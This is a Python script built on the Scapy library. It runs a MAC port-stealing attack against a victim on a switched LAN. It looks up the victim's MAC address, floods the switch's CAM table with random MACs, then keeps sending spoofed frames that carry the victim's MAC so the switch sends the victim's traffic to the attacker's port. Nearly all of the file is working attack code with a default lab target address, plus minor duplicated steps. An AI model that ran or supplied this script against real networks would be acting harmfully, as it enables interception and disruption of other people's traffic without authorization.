#!/usr/bin/env python3
from scapy.all import *
import sys
import time

def port_stealing(victim_ip, interface="ens224", count=5000):
    print(f"[*] Port Stealing attack against {victim_ip} on {interface}")
    
    # 1. Resolve victim MAC
    print("[*] Resolving victim MAC...")
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip), timeout=2, iface=interface, verbose=False)
        if not ans:
            print("[-] Victim MAC not found.")
            return
        victim_mac = ans[0][1].hwsrc
    except Exception as e:
        print(f"[-] Error: {e}")
        return
        
    print(f"[+] Victim MAC: {victim_mac}")

    # 2. Flood CAM to force switch to forget victim
    print("[*] Flooding CAM table...")
    for _ in range(200):
        mac = RandMAC()
        sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1), iface=interface, verbose=False)

    # 3. Port Stealing: Send frames with victim's MAC as source
    print(f"[*] Sending frames with source MAC {victim_mac}...")
    # The switch will update its CAM table to map victim_mac to this port
    pkt = Ether(src=victim_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, psrc=victim_ip, hwsrc=victim_mac)
    
    # 3. Continuous Port Stealing
    print(f"[*] Stealing port... Sending frames with source MAC {victim_mac}...")
    pkt = Ether(src=victim_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, psrc=victim_ip, hwsrc=victim_mac)
    
    try:
        while True:
            sendp(pkt, iface=interface, verbose=False)
            time.sleep(0.05)
    except KeyboardInterrupt:
        print("\n[*] Stopping attack and restoring network...")
        # Envoie une requête ARP à la victime pour qu'elle réponde
        # Le switch verra la vraie MAC sur le bon port et corrigera la table
        send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip), iface=interface, verbose=False)
        time.sleep(1)
        print("[+] Network restored.")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.189.200"
    port_stealing(target)
